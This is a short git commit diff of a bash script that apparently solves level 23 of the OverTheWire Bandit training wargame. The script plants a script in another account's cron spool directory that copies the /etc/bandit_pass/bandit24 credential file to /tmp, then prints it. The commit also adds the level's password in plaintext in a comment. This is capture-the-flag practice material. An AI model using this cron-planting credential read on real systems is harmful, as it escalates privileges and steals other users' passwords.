f5aac28abb0d2d69598f14a1ef47e0432024dc1e
userrussi <am4yz@proton.me>
2026-09-11 07:11:20 -0300

    Update bandit23.sh

--- bandit23.sh
+++ bandit23.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
+# bandit23 pass: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+# ssh bandit23@bandit.labs.overthewire.org -p 2220 'bash -s' < bandit23.sh
 
 if [ -d /tmp/fii ]; then
     echo
@@ -19,11 +21,13 @@ echo "cat /etc/bandit_pass/bandit24 > /tmp/fii/fill" >> /tmp/fii/z.sh
 mv /tmp/fii/z.sh /var/spool/bandit24/foo
 
 a=62
-while [ $a -gt 0 ]
-do
-    ((a--))
-    echo "a: $a"
-    sleep 1
-done
 
-cat /tmp/fii/fill
+# If this block does not working remove the while loop and do this:
+# sleep 62
+while [ "$a" -gt 0 ]; do
+    printf "\rWaiting: %2ds" "$a"
+    sleep 1
+    ((a--))
+done
+echo
+echo "The password is: $(cat /tmp/fii/fill)"
